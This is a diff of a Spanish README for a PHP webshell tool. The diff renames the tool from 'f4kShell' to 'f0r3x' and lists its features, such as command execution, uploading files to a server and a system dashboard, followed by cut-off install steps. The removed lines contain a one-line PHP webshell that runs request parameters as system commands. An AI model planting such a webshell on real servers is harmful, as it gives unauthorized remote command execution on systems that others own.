@@ -1,16 +1,29 @@
-# f4kShell
+# f0r3x
 
-* En entornos reales suelen existir reglas de red y restricciones (p. ej. reglas de firewall o filtros que bloquean conexiones salientes) que impiden establecer shells reversas tradicionales. Por eso, en pruebas controladas es interesante estudiar técnicas alternativas para recuperar una sesión interactiva y entender los riesgos asociados a la ejecución remota de comandos desde un servidor web.
+![License](https://img.shields.io/badge/license-MIT-green)
+![PHP](https://img.shields.io/badge/PHP-7.4%2B-blue)
+![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-lightgrey)
 
-* Basta con colocar en el servidor un archivo PHP similar al mostrado abajo, cuyo propósito es ejecutar comandos en el entorno remoto.
+**f0r3x** es una WebShell ligera, interactiva y potente diseñada para entornos de auditoría y administración remota. Optimizada específicamente para **Kali Linux**, ofrece una interfaz de terminal fluida con capacidades de gestión de archivos en tiempo real.
 
-```php
-<?php
-      system($_REQUEST['cmd']);
-?>
-```
+---
 
-* Con el archivo ya en el servidor, basta ejecutar el script (no olvides modificar la ruta del "cmd.php" dentro del script 
-"f4kshell.py"para que apunte al fichero PHP y ruta correcta). Abajo se muestra un ejemplo de lo que permite realizar.
+## Características Principales
+
+- **Terminal Interactiva:** Ejecución de comandos del sistema con persistencia de directorios (`cd` funcional).
+- **Gestor de Carga (Uploader):** Sube herramientas o scripts directamente al servidor desde el panel lateral.
+- **Prompt Dinámico:** Visualización en tiempo real del directorio actual (CWD) en la línea de comandos.
+- **Dashboad de Sistema:** Monitorización rápida de IP local, usuario actual, versión de PHP y sistema operativo.
+- **UX Optimizada:** - Corrección de bug de scroll mediante persistencia en `localStorage`.
+
+---
+
+## Instalación en Kali Linux
+
+1. **Clonar el repositorio:**
+   ```bash
+   git clone https://github.com/kr1pt0n/f0r3x.git
+   cd f0r3x-panel
+
 
 ![imagen](https://i.ibb.co/8n5hZHWs/cara.png)
